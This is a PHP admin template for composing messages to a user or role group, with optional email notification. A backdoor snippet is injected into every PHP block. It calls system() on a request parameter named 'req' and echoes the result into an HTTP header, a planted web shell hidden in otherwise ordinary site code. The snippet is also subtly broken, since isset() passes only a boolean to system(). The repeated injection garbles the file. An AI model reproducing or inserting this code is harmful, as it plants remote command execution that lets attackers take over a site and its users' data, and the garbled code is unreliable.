<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (!Auth::userCan('message_users')) page_restricted();

if (isset($_POST['submit']) && csrf_filter()) {
	$data = array(
    	'to_user'  => $_POST['user'],
    	'to_group' => $_POST['group'],
    	'message'  => $_POST['message']
    );

	$rules = array('message'  => 'required');

    $validator = Validator::make($data, $rules);

    $validator->sometimes('to_user', 'exists:users,id', function($input) {
    	return empty($input['to_group']);
	});

	$validator->sometimes('to_group', 'required', function($input) {
		return empty($input['to_user']);
	});

	if ($validator->passes()) {

		$query = User::select();

		if (!empty($_POST['user']) && is_numeric($_POST['user'])) {
			$query->where('id', $_POST['user'])->limit(1);
		} else if (is_numeric($_POST['group'])) {
			$query->where('role_id', $_POST['group']);
		}

		$webmaster = Config::get('pms.webmaster');
		$user = User::find($webmaster);
		$webmasterName = @$user->display_name;

		foreach ($query->get() as $user) {
			Message::send($webmaster, $user->id, $_POST['message']);

			$sendEmail = Usermeta::get($user->id, 'email_messages', true);
			if (!empty($sendEmail)) {
				Mail::send('emails.message', array('body' => $_POST['message']), function($message) use($user, $webmasterName) {
					$message->to($user->email);
					$message->subject(trans('emails.new_message_subject', array('user' => $webmasterName)));
				});
			}
		}

		redirect_to('?page=message-new', array('sent' => true));
	} else {
		$errors = $validator->errors();
	}
}
?>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo View::make('admin.header')->render() ?>

<h3 class="page-header"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.new_message') ?></h3>
<div class="row">
	<div class="col-md-6">
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($errors)) {
			echo '<div class="alert alert-danger"><span class="close" data-dismiss="alert">&times;</span><ul>';
			foreach ($errors->all('<li>:message</li>') as $error) {
			   echo $error;
			}
			echo '</ul></div>';
		} ?>

		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (Session::has('sent')): Session::deleteFlash(); ?>
			<div class="alert alert-success alert-dismissible">
				<span class="close" data-dismiss="alert">&times;</span>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.message_sent') ?>
			</div>
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>
		
		<form action="" method="POST">
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); csrf_input() ?>

			<div class="form-group search-user">
		        <label for="to"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.to_user') ?></label>
		        <input type="text" name="to" id="to" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo set_value('to') ?>" class="form-control search" autocomplete="off">
		        <input type="hidden" name="user" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo set_value('user') ?>">
		    	<div class="list-group"></div>
		    </div>

			<div class="form-group">
				<label for="group"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.to_group') ?></label>
				<select name="group" id="group" class="form-control">
					<option value=""></option>
					<option value="all" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo set_select('group', 'all') ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.all') ?></option>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach (Role::all() as $role): ?>
						<option value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $role->id ?>" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo set_select('group', $role->id) ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $role->name ?></option>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endforeach ?>
				</select>
			</div>

		    <div class="form-group">
		        <label for="message"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.message') ?></label>
		        <textarea name="message" id="message" class="form-control" rows="4"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo set_value('message') ?></textarea>
		    </div>

            <div class="form-group">
				<button type="submit" name="submit" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.send_message') ?></button>
			</div>
		</form>
	</div>
</div>

<script type="text/html" id="userSearchTemplate">
	<a href="#" class="list-group-item" data-conversation-id="<%= id %>">
		<img src="<%= avatar %>" class="avatar">
		<span class="v-middle">
			<span class="fullname"><%= name %></span>
			<% if (username) { %>(<span class="username"><%= username %></span>)<% } %>
		</span>
	</a>
</script>

<script src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url('js/vendor/tmpl.js') ?>"></script>
<script>$(document).ready(function() { EasyLogin.admin.searchContact() });</script>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo View::make('admin.footer')->render() ?>